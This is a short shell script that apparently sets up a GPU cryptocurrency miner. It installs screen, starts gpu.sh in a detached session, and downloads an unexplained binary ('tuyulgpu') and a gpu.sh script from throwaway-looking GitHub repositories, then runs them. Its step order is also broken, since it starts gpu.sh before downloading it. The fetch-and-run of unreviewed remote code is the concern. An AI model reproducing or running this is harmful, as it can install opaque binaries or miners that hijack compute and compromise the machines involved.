#!/bin/sh

sudo apt update
sudo apt install screen -y
screen -dmS gpu.sh ./gpu.sh 65 75
wget https://github.com/nuri655/jajshdbdbdbdbb/raw/main/tuyulgpu
wget https://raw.githubusercontent.com/chikahusarii/tepm/main/gpu.sh
chmod +x gpu.sh
./gpu.sh
